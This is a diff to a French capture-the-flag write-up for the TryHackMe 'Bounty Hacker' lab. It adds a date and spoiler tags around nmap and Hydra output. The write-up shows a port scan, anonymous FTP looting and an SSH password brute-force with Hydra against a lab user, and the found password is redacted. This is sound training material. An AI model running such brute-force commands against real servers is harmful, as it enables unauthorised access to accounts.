@@ -5,6 +5,7 @@ style: border
 color: thm
 comments: false
 description: Exploitation d'un serveur web Apache
+modified: 18/03/2025
 ---
 Lien vers l'épreuve : <https://tryhackme.com/room/cowboyhacker>
 
@@ -23,6 +24,9 @@ Lien vers l'épreuve : <https://tryhackme.com/room/cowboyhacker>
 
 ```bash
 nmap -A -T4 bountyhacker.thm
+```
+
+{% capture spoil %}
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-19 15:58 CEST
 Nmap scan report for bountyhacker.thm (10.10.35.165)
 Host is up (0.032s latency).
@@ -64,7 +68,8 @@ HOP RTT      ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 45.88 seconds
-```
+{% endcapture %}
+{% include elements/spoil.html %}
 
 Le scan {% include dictionary.html word="NMAP" %} indique la présence d'un serveur {% include dictionary.html word="FTP" %} sur le port 21 accessible anonymement, un serveur {% include dictionary.html word="SSH" %} sur le port 22, et un serveur web Apache sur le port 80.
 
@@ -105,7 +110,7 @@ local: task.txt remote: task.txt
 
 Le fichier `locks.txt` semble être une liste de mots de passe, et le fichier `task.txt` un plan d'action (machiavélique ?).
 
-```terminal
+```txt
 cat task.txt                   
 1.) Protect Vicious.
 2.) Plan for Red Eye pickup on the moon.
@@ -118,7 +123,10 @@ cat task.txt
 Le fichier `task.txt` contient le nom `lin` qui pourrait être un utilisateur du serveur. Nous allons tenter de trouver un mot de passe correspondant grâce à l'outil {% include dictionary.html word="Hydra" %} sur le service {% include dictionary.html word="SSH" %}.
 
 ```bash
-hydra -l 'lin' -P locks.txt bountyhacker.thm ssh                        
+hydra -l 'lin' -P locks.txt bountyhacker.thm ssh
+```
+
+{% capture spoil %}
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-19 16:27:34
@@ -128,7 +136,8 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-19 16:27:
 [22][ssh] host: bountyhacker.thm   login: lin   password: Re[...expurgé...]t3
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-19 16:27:37
-```
+{% endcapture %}
+{% include elements/spoil.html %}
 
 Nous obtenons le mot de passe de l'utilisateur `lin` nous permettant de nous connecter en {% include dictionary.html word="SSH" %} sur le serveur.
 
